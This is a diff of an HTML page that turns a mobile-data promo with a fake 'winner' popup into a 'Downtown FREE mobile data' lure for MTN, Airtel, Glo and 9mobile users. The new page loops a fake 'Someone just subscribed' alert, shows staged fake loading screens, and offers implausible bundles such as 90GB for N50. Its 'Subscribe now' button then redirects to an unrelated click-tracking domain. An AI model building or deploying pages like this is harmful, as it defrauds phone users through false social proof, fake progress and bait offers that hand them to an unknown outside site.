@@ -1,590 +1,76 @@
-<!DOCTYPE html>
+<!doctype html>
+
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Downtown Official Promo - Unlimited Data Bundles</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        :root {
-            --primary: #2c3e50;
-            --secondary: #3498db;
-            --accent: #e74c3c;
-            --light: #ecf0f1;
-            --dark: #2c3e50;
-            --success: #2ecc71;
-            --warning: #f39c12;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            color: var(--light);
-            min-height: 100vh;
-            padding: 20px;
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        header {
-            text-align: center;
-            padding: 40px 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .logo {
-            font-size: 3.5rem;
-            color: var(--warning);
-            background: rgba(255, 255, 255, 0.1);
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        h1 {
-            font-size: 2.8rem;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            color: white;
-        }
-        
-        .sub-heading {
-            font-size: 1.5rem;
-            margin-bottom: 25px;
-            color: var(--warning);
-            font-weight: 600;
-        }
-        
-        .highlight {
-            color: var(--warning);
-            font-weight: bold;
-        }
-        
-        .networks {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 30px 0;
-            flex-wrap: wrap;
-        }
-        
-        .network-logo {
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            font-weight: bold;
-            transition: transform 0.3s, background 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
-        
-        .network-logo:hover {
-            transform: scale(1.1);
-            background: rgba(255, 255, 255, 0.2);
-        }
-        
-        .timer-container {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            padding: 15px;
-            display: inline-block;
-            margin: 20px 0;
-        }
-        
-        .timer {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: var(--warning);
-        }
-        
-        .data-plans {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 40px 0;
-            flex-wrap: wrap;
-        }
-        
-        .plan {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 30px 20px;
-            width: 280px;
-            text-align: center;
-            transition: transform 0.3s, background 0.3s;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .plan::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: var(--warning);
-        }
-        
-        .plan.popular::after {
-            content: 'MOST POPULAR';
-            position: absolute;
-            top: 15px;
-            right: -30px;
-            background: var(--accent);
-            color: white;
-            padding: 5px 30px;
-            font-size: 0.8rem;
-            transform: rotate(45deg);
-        }
-        
-        .plan:hover {
-            transform: translateY(-10px);
-            background: rgba(255, 255, 255, 0.15);
-        }
-        
-        .plan h3 {
-            font-size: 2.2rem;
-            margin-bottom: 15px;
-            color: var(--warning);
-        }
-        
-        .plan p {
-            font-size: 1.1rem;
-            margin-bottom: 15px;
-        }
-        
-        .price {
-            font-size: 1.8rem;
-            font-weight: bold;
-            margin: 20px 0;
-            color: var(--success);
-        }
-        
-        .btn {
-            background: linear-gradient(to right, var(--warning), #ff9900);
-            color: #000;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            margin-top: 10px;
-        }
-        
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.95);
-            border-radius: 15px;
-            padding: 25px;
-            width: 380px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            transform: translateX(400px);
-            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-            border-left: 5px solid var(--warning);
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .notification-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .notification h3 {
-            color: var(--warning);
-            font-size: 1.4rem;
-        }
-        
-        .notification-icon {
-            font-size: 1.8rem;
-            color: var(--warning);
-        }
-        
-        .notification p {
-            margin-bottom: 10px;
-            font-size: 1.1rem;
-        }
-        
-        .winner-number {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: var(--warning);
-            text-align: center;
-            margin: 15px 0;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-        }
-        
-        .close-btn {
-            background: var(--warning);
-            color: #000;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 15px;
-            width: 100%;
-            transition: background 0.3s;
-        }
-        
-        .close-btn:hover {
-            background: #ff9900;
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 50px 0;
-        }
-        
-        .feature {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .feature i {
-            font-size: 2.5rem;
-            color: var(--warning);
-            margin-bottom: 15px;
-        }
-        
-        .feature h3 {
-            margin-bottom: 10px;
-            color: var(--warning);
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 15px;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-        
-        .footer-links a {
-            color: var(--light);
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-        
-        .footer-links a:hover {
-            color: var(--warning);
-        }
-        
-        .social-icons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .social-icons a {
-            color: var(--light);
-            font-size: 1.5rem;
-            transition: color 0.3s, transform 0.3s;
-        }
-        
-        .social-icons a:hover {
-            color: var(--warning);
-            transform: translateY(-5px);
-        }
-        
-        @media (max-width: 768px) {
-            .data-plans {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .plan {
-                width: 90%;
-            }
-            
-            .notification {
-                width: 90%;
-                right: 5%;
-            }
-            
-            h1 {
-                font-size: 2.2rem;
-            }
-            
-            .logo {
-                font-size: 2.8rem;
-                width: 80px;
-                height: 80px;
-            }
-            
-            .network-logo {
-                width: 70px;
-                height: 70px;
-                font-size: 1.7rem;
-            }
-        }
-        
-        /* Animation for elements */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .fade-in {
-            animation: fadeIn 0.8s ease forwards;
-        }
-        
-        .delay-1 { animation-delay: 0.2s; }
-        .delay-2 { animation-delay: 0.4s; }
-        .delay-3 { animation-delay: 0.6s; }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Downtown FREE Data Service</title>
+<style>
+  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#0f172a;color:white;}
+  .page{display:none;min-height:100vh;padding:20px;box-sizing:border-box;}
+  .active{display:block;}
+  h1,h2{text-align:center;font-weight:700;}
+  .card{background:#1e293b;padding:20px;border-radius:12px;max-width:450px;margin:auto;}
+  .network-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:20px;}
+  .network-btn{padding:15px;border-radius:10px;background:#334155;color:#fff;border:none;font-size:18px;display:flex;align-items:center;justify-content:center;gap:8px;cursor:pointer;}
+  .loader{text-align:center;margin-top:60px;}
+  .loader div{width:50px;height:50px;border-radius:50%;border:6px solid rgba(255,255,255,.2);border-top-color:white;margin:auto;animation:spin 1s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .notif{position:fixed;top:15px;left:50%;transform:translateX(-50%);background:#fff;color:#111;padding:10px 18px;border-radius:6px;font-size:14px;display:none;box-shadow:0 0 8px rgba(0,0,0,.3);}
+  .plan{background:#0ea5e9;padding:12px;border-radius:10px;margin:12px 0;font-size:18px;font-weight:600;text-align:center;color:white;}
+  .btn-main{width:100%;padding:16px;background:#22c55e;border:none;color:white;font-size:18px;border-radius:12px;margin-top:20px;cursor:pointer;position:relative;}
+  .btn-main.loading{opacity:.7;pointer-events:none;}
+  .btn-main.loading:after{content:"";position:absolute;right:20px;top:50%;transform:translateY(-50%);width:20px;height:20px;border:3px solid rgba(255,255,255,.2);border-top-color:white;border-radius:50%;animation:spin .8s linear infinite;}
+</style>
 </head>
 <body>
-    <div class="container">
-        <header class="fade-in">
-            <div class="logo-container">
-                <div class="logo">
-                    <i class="fas fa-wifi"></i>
-                </div>
-                <div>
-                    <h1>Downtown Official Promo</h1>
-                    <p class="sub-heading">Get Unlimited Data Bundle for All Networks</p>
-                </div>
-            </div>
-            
-            <div class="networks">
-                <div class="network-logo">MTN</div>
-                <div class="network-logo">Airtel</div>
-                <div class="network-logo">Glo</div>
-                <div class="network-logo">9mobile</div>
-            </div>
-            
-            <div class="timer-container">
-                <div class="timer">
-                    <i class="fas fa-clock"></i> <span id="countdown">Ends 22:00</span>
-                </div>
-            </div>
-        </header>
-        
-        <section class="data-plans">
-            <div class="plan fade-in">
-                <h3>30GB</h3>
-                <p>Perfect for moderate users</p>
-                <p>30 days validity</p>
-                <div class="price">₦2,500</div>
-                <button class="btn">Get Now</button>
-            </div>
-            
-            <div class="plan popular fade-in delay-1">
-                <h3>70GB</h3>
-                <p>Great for heavy users</p>
-                <p>30 days validity</p>
-                <div class="price">₦5,000</div>
-                <button class="btn">Get Now</button>
-            </div>
-            
-            <div class="plan fade-in delay-2">
-                <h3>100GB</h3>
-                <p>Unlimited experience</p>
-                <p>30 days validity</p>
-                <div class="price">₦7,500</div>
-                <button class="btn">Get Now</button>
-            </div>
-        </section>
-        
-        <section class="features">
-            <div class="feature fade-in">
-                <i class="fas fa-bolt"></i>
-                <h3>Lightning Fast</h3>
-                <p>Enjoy high-speed internet with our premium data bundles</p>
-            </div>
-            
-            <div class="feature fade-in delay-1">
-                <i class="fas fa-shield-alt"></i>
-                <h3>Secure & Reliable</h3>
-                <p>Your connection is protected with advanced security</p>
-            </div>
-            
-            <div class="feature fade-in delay-2">
-                <i class="fas fa-headset"></i>
-                <h3>24/7 Support</h3>
-                <p>Our customer service team is always available to help</p>
-            </div>
-            
-            <div class="feature fade-in delay-3">
-                <i class="fas fa-mobile-alt"></i>
-                <h3>Easy Recharge</h3>
-                <p>Simple and quick recharge process for all networks</p>
-            </div>
-        </section>
-        
-        <footer class="fade-in">
-            <p>© 2023 Downtown Official Promo. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Contact Us</a>
-                <a href="#">FAQs</a>
-            </div>
-            <div class="social-icons">
-                <a href="#"><i class="fab fa-facebook"></i></a>
-                <a href="#"><i class="fab fa-twitter"></i></a>
-                <a href="#"><i class="fab fa-instagram"></i></a>
-                <a href="#"><i class="fab fa-whatsapp"></i></a>
-            </div>
-        </footer>
+<div id="notif" class="notif">✔ Someone just subscribed</div><!-- PAGE 1 --><div id="page1" class="page active">
+  <h1>Downtown FREE mobile data</h1>
+  <div class="card">
+    <h2>Choose your Network</h2>
+    <div class="network-grid">
+      <button class="network-btn" onclick="goPage2()">MTN</button>
+      <button class="network-btn" onclick="goPage2()">AIRTEL</button>
+      <button class="network-btn" onclick="goPage2()">GLO</button>
+      <button class="network-btn" onclick="goPage2()">9MOBILE</button>
     </div>
-    
-    <div class="notification" id="winnerNotification">
-        <div class="notification-header">
-            <i class="fas fa-trophy notification-icon"></i>
-            <h3>Congratulations!</h3>
-        </div>
-        <p>You've won a free data bundle in our daily giveaway!</p>
-        <p>Winner Number:</p>
-        <div class="winner-number" id="winnerNumber">08123456789</div>
-        <p>Claim your prize within 24 hours</p>
-        <button class="close-btn" id="closeNotification">Close & Claim Prize</button>
-    </div>
-    
-    <script>
-        // Show notification after 3 seconds
-        setTimeout(function() {
-            document.getElementById('winnerNotification').classList.add('show');
-            
-            // Generate random phone number
-            const prefixes = ['080', '081', '070', '090', '091'];
-            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            let number = prefix;
-            
-            for(let i = 0; i < 7; i++) {
-                number += Math.floor(Math.random() * 10);
-            }
-            
-            document.getElementById('winnerNumber').textContent = number;
-        }, 3000);
-        
-        // Close notification
-        document.getElementById('closeNotification').addEventListener('click', function() {
-            document.getElementById('winnerNotification').classList.remove('show');
-        });
-        
-        // Countdown timer
-        function updateTimer() {
-            const now = new Date();
-            const endTime = new Date();
-            endTime.setHours(22, 0, 0, 0); // Set to 22:00
-            
-            if (now > endTime) {
-                endTime.setDate(endTime.getDate() + 1);
-            }
-            
-            const diff = endTime - now;
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            
-            document.getElementById('countdown').textContent = 
-                `Ends in ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        setInterval(updateTimer, 1000);
-        updateTimer();
-        
-        // Add interaction to buttons
-        document.querySelectorAll('.btn').forEach(button => {
-            button.addEventListener('click', function() {
-                const plan = this.closest('.plan').querySelector('h3').textContent;
-                alert(`Thank you for selecting the ${plan} plan! Our agents will contact you shortly to complete your purchase.`);
-            });
-        });
-        
-        // Add fade-in animation to elements as they scroll into view
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-        
-        const observer = new IntersectionObserver(function(entries) {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('fade-in');
-                }
-            });
-        }, observerOptions);
-        
-        document.querySelectorAll('section, .feature').forEach(el => {
-            observer.observe(el);
-        });
-    </script>
-</body>
+  </div>
+</div><!-- PAGE 2 (checking availability) --><div id="page2" class="page">
+  <h2>Checking for Available data...</h2>
+  <div class="loader"><div></div></div>
+</div><!-- PAGE 3 --><div id="page3" class="page">
+  <h2>Available data right now</h2>
+  <div class="card">
+    <div class="plan">MTN 90GB - N50</div>
+    <div class="plan">Airtel 70GB - N50</div>
+    <div class="plan">Glo 60GB - N50</div>
+    <div class="plan">9mobile 30GB - N75</div>
+    <button class="btn-main" onclick="goPage4()">Continue</button>
+  </div>
+</div><!-- PAGE 4 (loading) --><div id="page4" class="page">
+  <div class="loader"><div></div></div>
+</div><!-- PAGE 5 FINAL --><div id="page5" class="page">
+  <h2>🎉 Congrats! You qualify</h2>
+  <div class="card">
+    <p>You will get <b>90GB</b> + <b>N3,000 airtime</b> when you subscribe.</p>
+    <button class="btn-main" id="subscribeBtn" onclick="subscribe()">Subscribe now</button>
+  </div>
+</div><script>
+function showNotif(){
+  const n=document.getElementById("notif");
+  n.style.display="block";
+  setTimeout(()=>n.style.display="none",2500);
+}
+setInterval(showNotif,6000);
+
+function goPage2(){switchPage("page2");setTimeout(()=>switchPage("page3"),6000);}
+function goPage4(){switchPage("page4");setTimeout(()=>switchPage("page5"),6000);}
+function subscribe(){
+  const btn=document.getElementById("subscribeBtn");
+  btn.classList.add("loading");
+  setTimeout(()=>{window.location.href="https://qvxprml.one/cl/3ea525e3377b9038"},5000);
+}
+
+function switchPage(p){document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));document.getElementById(p).classList.add('active');}
+</script></body>
 </html>
